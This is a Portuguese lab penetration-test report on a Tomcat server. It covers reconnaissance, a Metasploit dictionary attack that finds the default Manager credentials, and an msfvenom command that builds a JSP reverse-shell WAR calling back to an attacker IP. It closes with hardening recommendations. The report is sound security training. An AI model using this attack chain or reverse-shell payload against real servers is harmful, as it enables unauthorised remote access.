#Pentest Thales

Este relatório apresenta os resultados do teste de intrusão realizado em uma máquina virtual hospedando um servidor web.

O teste foi realizado no dia 06/03/2026 em um ambiente de laboratório controlado
Foram utilziadas  as ferramentas netdiscover, nmap, feroxbuster e metasploit framework.
Durante o teste de intrusão foi identificado um serviço web vulnerável. A exposição do painel administrativo Tomcat Manager permitiu o upload de uma aplicação maliciosa contendo um payload de reverse shell, resultando em execução remota de código (RCE) no servidor.


##Tabela de Vulnerabilidades

Vulnerabilidade	Severidade	Vetor de Ataque	Status

Execução Remota de Código (RCE)	Crítica (9.8)	Upload de WAR via Tomcat Manager	Explorada

Credenciais Fracas/Padrão	Alta (8.1)	Ataque de Dicionário (Brute Force)	Explorada

Exposição de Painel Administrativo	Média (5.3)	Reconhecimento Web / Feroxbuster	Identificada


##Detalhamento Técnico

O processo iniciou com o uso do netdiscover, identificando o host alvo no IP 192.168.56.102. Subsequentemente, o nmap revelou os seguintes serviços ativos:

Porta 22/TCP: OpenSSH 7.6p1.

Porta 8080/TCP: Apache Tomcat 9.0.52.

Descoberta de Diretórios e Brute Force

Utilizando a ferramenta feroxbuster com a wordlist big.txt, mapeou-se o diretório crítico /manager/html. Através do Metasploit Framework (módulo scanner/http/tomcat_mgr_login), foi realizado um ataque de dicionário.

Resultado: Credenciais obtidas com sucesso (tomcat:role1), confirmando o uso de senhas padronizadas e inseguras.

Exploração (Ganhando Acesso)

Com acesso ao painel de gerenciamento, foi gerado um payload de reverse shell via msfvenom:
msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.56.101 lport=4444 -f war > shell.war 

O arquivo shell.war foi implantado (deploy) no servidor. Após a execução, foi estabelecida uma conexão reversa, resultando em uma shell interativa como o usuário tomcat no host miletus.


#Evidências Técnicas
##Reconhecimento

A ferramenta netdiscover foi utilizada para identificar o IP alvo que foi identificado com sucesso.

 <img width="886" height="184" alt="image" src="https://github.com/user-attachments/assets/72a91613-d83a-4293-8c82-ba819c9e25c9" />


Logo após foi utilizada a ferramenta nmap para realizar varredura de portas para descobrir portas abertas. Onde foi descoberta a porta 8080 rodando o serviço Apache Tomcat.
 
<img width="886" height="163" alt="image" src="https://github.com/user-attachments/assets/34c257c8-15dc-496d-9f3e-2075f04a124c" />



Feroxbuster foi usado para descoberta de diretórios onde identificamos o diretório manager.

<img width="886" height="495" alt="image" src="https://github.com/user-attachments/assets/71cb03ff-f169-48f0-a74f-bd4f2c6904c7" />
  

metasploit framework foi usado para a obtenção de credencial com um tipo de brute force chamado Dictionary Attack (lista de senhas conhecidas) indicando que a senha era padronizada. Login realizado com sucesso, obtendo assim acesso ao painel Tomcat manager.
 
 <img width="685" height="102" alt="image" src="https://github.com/user-attachments/assets/af7aa2dd-c6c7-4dbd-a168-f162926f0150" />

<img width="736" height="196" alt="image" src="https://github.com/user-attachments/assets/5965221f-da6c-4f4b-a416-55aec9a71c63" />

 <img width="422" height="289" alt="image" src="https://github.com/user-attachments/assets/bb21eddc-6083-4ec3-8160-21acd47b78bc" />

Foi criado um payload de reverse shell empacotado em um arquivo .war, que foi enviado ao servidor através do painel Apache Tomcat Manager.
Após a execução do arquivo no servidor, foi estabelecida uma conexão reversa entre o servidor alvo e a máquina atacante, permitindo acesso remoto ao sistema.
 
 <img width="878" height="136" alt="image" src="https://github.com/user-attachments/assets/57de0d8d-41c0-4feb-9b3b-29429c4ec916" />

 <img width="772" height="128" alt="image" src="https://github.com/user-attachments/assets/761b27c9-6d2d-4b15-88ba-c8de05a7287c" />

 <img width="886" height="54" alt="image" src="https://github.com/user-attachments/assets/893a2a2f-e666-45e7-aa29-d0a34cd74480" />

<img width="375" height="230" alt="image" src="https://github.com/user-attachments/assets/a5926b4d-3ace-4599-a531-77a354f832f3" />


##Recomendações de Segurança

Remover ou restringir o acesso ao Tomcat Manager

O painel administrativo do Apache Tomcat Manager não deve estar exposto publicamente na rede.

Recomenda-se restringir o acesso apenas a endereços IP autorizados ou à rede interna da organização.

Utilizar senhas fortes e únicas

Foi possível obter credenciais válidas do serviço.
Recomenda-se implementar Senhas complexas, política de troca periódica de senha e Proibição de credenciais padrão


##Implementar proteção contra força bruta

Ferramentas automatizadas como o Metasploit Framework podem realizar múltiplas tentativas de autenticação. 

Recomenda-se Bloqueio temporário após várias tentativas de login, rate limiting e monitoramento de tentativas de autenticação

Desabilitar funcionalidades desnecessárias

Caso o Tomcat Manager não seja essencial para o ambiente de produção, recomenda-se sua remoção ou desativação, reduzindo a superfície de ataque.


##Implementar monitoramento e logs

Recomenda-se habilitar:

•	Monitoramento de acesso ao painel administrativo

•	Logs de autenticação

•	Alertas para atividades suspeitas

Isso permite identificar tentativas de exploração de forma antecipada.


##Atualizar o servidor e aplicar patches

Manter o Apache Tomcat e sistema operacional sempre atualizados com as últimas correções de segurança para evitar exploração de vulnerabilidades conhecidas.

